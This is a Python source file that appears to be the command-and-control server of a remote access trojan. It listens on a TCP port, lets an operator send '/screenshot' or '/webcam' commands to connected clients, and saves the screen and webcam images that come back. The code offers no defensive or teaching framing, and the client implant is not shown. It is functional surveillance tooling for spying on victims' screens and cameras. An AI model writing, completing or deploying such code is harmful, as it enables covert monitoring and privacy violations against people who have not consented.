
from socket import *

host = ''
port = 6522
addr = (host,port)

clients = []

tcp_socket = socket(AF_INET, SOCK_STREAM)

tcp_socket.bind(addr)

tcp_socket.listen(90)

while True:
    print('wait connection...')
    
    conn, addr = tcp_socket.accept()
    print('client addr: ', addr)
    data = conn.recv(1024)

    if not data:
        conn.close()
        break
    else:
        command = input("\n\n/screenshot - take screenshot\n/webcam - take photo on webcam \n-> ")
        conn.send(command.encode())
        print(command.encode())
        if command == "/screenshot":
            file = open("screenshot.png", "wb")
            image_chunk = conn.recv(2048)
            while image_chunk:
                file.write(image_chunk)
                image_chunk = conn.recv(2048)
            file.close()
        elif command == "/webcam":
            file = open("webcam.png", "wb")
            image_chunk = conn.recv(2048)
            while image_chunk:
                file.write(image_chunk)
                image_chunk = conn.recv(2048)
            file.close()
        conn.close()
    
tcp_socket.close()



